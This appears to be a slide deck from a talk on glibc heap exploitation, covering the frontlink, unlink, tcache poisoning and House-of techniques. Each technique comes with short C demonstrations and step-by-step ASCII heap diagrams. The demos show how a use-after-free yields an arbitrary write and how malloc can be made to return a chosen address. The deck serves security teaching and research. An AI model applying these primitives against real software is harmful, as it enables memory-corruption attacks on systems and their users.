# Attacks
Write It


## Structural Attacks

Using the allocator's internal data structures for overwriting arbtirary memory


### [Frontlink][Vudo Malloc Tricks]

* Insert node to a linked list
    ```C
    void frontlink(mchunkptr prev, mchunkptr p) {
        p->fd = prev->fd;
        prev->fd = p;
    }
    ```
* Control prev's fd => write-pointer-to-what-where <!-- .element: data-code-focus="3" -->
* Controlling prev requires:
    - Ability to [overwrite the list's head](http://blog.frizn.fr/glibc/glibc-heap-to-rip)
    - Insertion to large bin
* Never mitigated!!!!!!!
* Articles:
    - PoC||GTFO 0x18 House of Fun
    - [Vudo Malloc Tricks]

[Vudo Malloc Tricks]: http://phrack.org/issues/57/8.html
Note: Inserting to a list happens in `free` and `p` points to data the designer may control


### Frontlink - Example
```C
void **p0 = malloc(0x400);
malloc(0x20);
void **p1 = malloc(0x420);
malloc(0x20);
free(p0);
free(malloc(0x1000));
p0[1] = 0xdeadbeef;
free(p1);
free(malloc(0x1000));
```

```C 
            large_bin(400-430)
                 |
         +---------------------------------------------+
Arena    |      ||fd|bk||                              |
         +-------^---|---------------------------------+
                 |   |
                 +---+               
                                            
         +------------------------------------------------------+
Heap     |wildreness                                            |
         +------------------------------------------------------+
         |
        top
                                          

```
<!-- .element: class="fragment fade-in" -->

```C 
            large_bin(400-430)
                 |
         +---------------------------------------------+
Arena    |      ||fd|bk||                              |
         +-------^---|---------------------------------+
                 |   |
                 +---+               

         +------------------------------------------------------+
Heap     |401|...      |wildreness                              |
         +------------------------------------------------------+
             |         |
             p0       top
                                          

```
<!-- .element: class="fragment fade-over" data-code-focus="1" -->

```C 
            large_bin(400-430)
                 |
         +---------------------------------------------+
Arena    |      ||fd|bk||                              |
         +-------^---|---------------------------------+
                 |   |
                 +---+               

         +------------------------------------------------------+
Heap     |401|...      |21|...|wildreness                       |
         +------------------------------------------------------+
             |                |
             p0              top
                                          

```
<!-- .element: class="fragment fade-over" data-code-focus="2" -->

```C 
            large_bin(400-430)
                 |
         +---------------------------------------------+
Arena    |      ||fd|bk||                              |
         +-------^---|---------------------------------+
                 |   |
                 +---+               

         +------------------------------------------------------+
Heap     |401|...      |21|...|421|...      |wildreness         |
         +------------------------------------------------------+
             |                    |         |
             p0                  p1        top

```
<!-- .element: class="fragment fade-over" data-code-focus="3" -->

```C 
            large_bin(400-430)
                 |
         +---------------------------------------------+
Arena    |      ||fd|bk||                              |
         +-------^---|---------------------------------+
                 |   |
                 +---+               

         +------------------------------------------------------+
Heap     |401|...      |21|...|421|...      |21|...|wildreness  |
         +------------------------------------------------------+
             |                    |                |
             p0                  p1               top

```
<!-- .element: class="fragment fade-over" data-code-focus="4" -->

```C 
            large_bin(400-430)
                 |
         +---------------------------------------------+
Arena    |      ||fd|bk||                              |
         +-------^----|--------------------------------+
                 |    |  
             +---+----+                 
             |   |                      
         +---v---|----------------------------------------------+
Heap     |400|fd|bk|...|21|...|421|...      |21|...|wildreness  |
         +------------------------------------------------------+
             |                    |                |
             p0                  p1               top
```
<!-- .element: class="fragment fade-over" data-code-focus="5-6" -->

```C 
            large_bin(400-430)
                 |
         +---------------------------------------------+
Arena    |      ||fd|bk||                              |
         +------------|--------------------------------+
                      |  
               +------+                 
               |                        
         +-----v------------------------------------------------+
Heap     |400|fd|bk|...|21|...|421|...      |21|...|wildreness  |
         +-------|----------------------------------------------+
             |   |                |                |
             p0  |               p1               top
                 |
             +---v---+                  
0xdeadbeef:  |xxxxxxx|
             +-------+
```
<!-- .element: class="fragment fade-over" data-code-focus="7" -->

```C 
            large_bin(400-430)
                 |
         +---------------------------------------------+
Arena    |      ||fd|bk||                              |
         +------------|--------------------------------+
                      |  
               +------+                 
               |                        
         +-----v------------------------------------------------+
Heap     |400|fd|bk|...|21|...|421|...      |21|...|wildreness  |
         +-------|------------^---------------------------------+
             |   |            |   |                |
             p0  | +----------+  p1               top
                 | |
             +---v-|-+                  
0xdeadbeef:  |xxxxxxx|
             +-------+
```
<!-- .element: class="fragment fade-over" data-code-focus="8-9" -->

Note:
Alloc UAF chunk 
Alloc separator 
Alloc pointed chunk 
Alloc separator 
Insert UAF chunk to large bin 
Use UAF to point to arbitrary memory 
Insert to large bin - do the frontlink attack 


### [Unlink][Vudo Malloc Tricks]
* Remove node from linked list:
    ```C
    void unlink(mchunkptr p) {
        p->bk->fd = p->fd;
    }
    ```
* Control chunk's `bk` and `fd` => write-what-where
* Mitgated (2004): 
```C
if (p->bk->fd != p) malloc_printerr(check_action, ...)
```
* Still useful:
    - [Unsorted Bin Attack]: un-mitigated unlink
    - [House of Cards]: overwrite global `check_action` which changes `malloc_printerr` to no-op
    - [Unlink pointer] to attacker controlled data

[Vudo Malloc Tricks]: http://phrack.org/issues/57/8.html
[Unsorted Bin Attack]: https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c
[House of Cards]: http://tukan.farm/2016/09/04/fastbin-fever/
[Unlink pointer]: https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html 

Note:
`malloc_printerr` changed in glibc 2.27 and always termintes the process


## Functionality Attacks

Overriding allocator's metadata to induce allocation to user in arbitrary memory


### [Tcache Poison Attack] (2.26+)
* `tcache` is singly linked cache of chunks
    ```C
    static void *tcache_get (size_t tc_idx)
    {
      tcache_entry *e = tcache->entries[tc_idx];
      tcache->entries[tc_idx] = e->next;
      return (void *) e;
    }
    ```
* Attacker controls e->next (fd) <!-- .element: data-code-focus="4" -->
* Malloc returns attacker controlled location 

[Tcache Poison Attack]: http://tukan.farm/2017/07/08/tcache/


### Tcache Poison Atttack (2.26) - Example
```C
char buf[8] = {0};
void **p0 = malloc(0x90);
free(p0);
*p0 = buf;
malloc(0x90);
void **p1 = malloc(0x90);
*p1 = 0xdeadbeef;
```

```C 
         +---------------------------------------------+
tcache   |NULL|NULL|NULL|...                           |
         +---------------------------------------------+

 
         +------------------------------------------------------+
Heap     |wildreness                                            |
         +------------------------------------------------------+
         |
         top
 
 
      
             +--------+
buf@stack    |00000000|
             +--------+                      
```
<!-- .element: class="fragment" data-code-focus="1" -->

```C 
         +---------------------------------------------+
tcache   |NULL|NULL|NULL|...                           |
         +---------------------------------------------+

 
         +------------------------------------------------------+
Heap     |91|...    |wildreness                                 |
         +------------------------------------------------------+
            |       |
            p0      top
      
 
 
             +--------+
buf@stack    |00000000|
             +--------+                      
```
<!-- .element: class="fragment fade-over" data-code-focus="2" -->

```C 
         +---------------------------------------------+
tcache   | +  |NULL|NULL|...                           |
         +-|-------------------------------------------+
           +-+
             |
         +---v--------------------------------------------------+
Heap     |91| NULL  |wildreness                                 |
         +------------------------------------------------------+
            |       |
            p0      top
                 
 
 
             +--------+
buf@stack    |00000000|
             +--------+                      
```
<!-- .element: class="fragment fade-over" data-code-focus="3" -->

```C 
         +---------------------------------------------+
tcache   | +  |NULL|NULL|...                           |
         +-|-------------------------------------------+
           +-+
             |
         +---v--------------------------------------------------+
Heap     |91|  +    |wildreness                                 |
         +-----|------------------------------------------------+
            |  |    |
            p0 |    top
               |
               |
               |
             +-V------+
buf@stack    |00000000|
             +--------+                      
```
<!-- .element: class="fragment fade-over" data-code-focus="4" -->

```C 
         +---------------------------------------------+
tcache   | +  |NULL|NULL|...                           |
         +-|-------------------------------------------+
      +----+  
      |       
      |  +------------------------------------------------------+
Heap  |  |91|...    |wildreness                                 |
      |  +------------------------------------------------------+
      |     |       |
      |     p0      top
      +--------+
               |
               |
             +-V------+
buf@stack    |00000000|
             +--------+                      
```
<!-- .element: class="fragment fade-over" data-code-focus="5" -->

```C 
         +---------------------------------------------+
tcache   |NULL|NULL|NULL|...                           |
         +---------------------------------------------+
              
 
         +------------------------------------------------------+
Heap     |91|...    |wildreness                                 |
         +------------------------------------------------------+
            |       |
            p0      top

             p1
             |
             +--------+
buf@stack    |00000000|
             +--------+                      
```
<!-- .element: class="fragment fade-over" data-code-focus="6" -->

```C 
         +---------------------------------------------+
tcache   |NULL|NULL|NULL|...                           |
         +---------------------------------------------+
 
               
         +------------------------------------------------------+
Heap     |91|...    |wildreness                                 |
         +------------------------------------------------------+
            |       |
            p0      top

             p1
             |
             +--------+
buf@stack    |efbeadde|
             +--------+                      
```
<!-- .element: class="fragment fade-over" data-code-focus="7" -->


### [Malloc Maleficarum] et al
* [House of Lore]
* [House of Force]
* [House of Spirit]
* [Fast Bin Attack] 

[Malloc Maleficarum]: https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt
[House of Lore]: https://github.com/shellphish/how2heap/blob/master/house_of_lore.c
[House of Force]: https://github.com/shellphish/how2heap/blob/master/house_of_force.c
[House of Spirit]: https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c
[Fast Bin Attack]: http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html 


## Restricted Functionality Attacks
Restricted overriding metadata to compromise the integrity of other data on the heap

* [Poisoned NULL Byte](https://googleprojectzero.blogspot.lu/2014/08/the-poisoned-nul-byte-2014-edition.html)
* [Fragment-and-Write](https://www.alchemistowl.org/pocorgtfo/pocorgtfo16.pdf "Adventure of the Fragmented Chunks")

Note:
bunch of ways to create overlapping chunks or forgotten chunks
turn liner write to relative write


## Other Cool Tricks
* [`munmap` any page](http://tukan.farm/2016/07/27/munmap-madness/)
* [Allocation of bins](http://blog.frizn.fr/glibc/glibc-heap-to-rip)
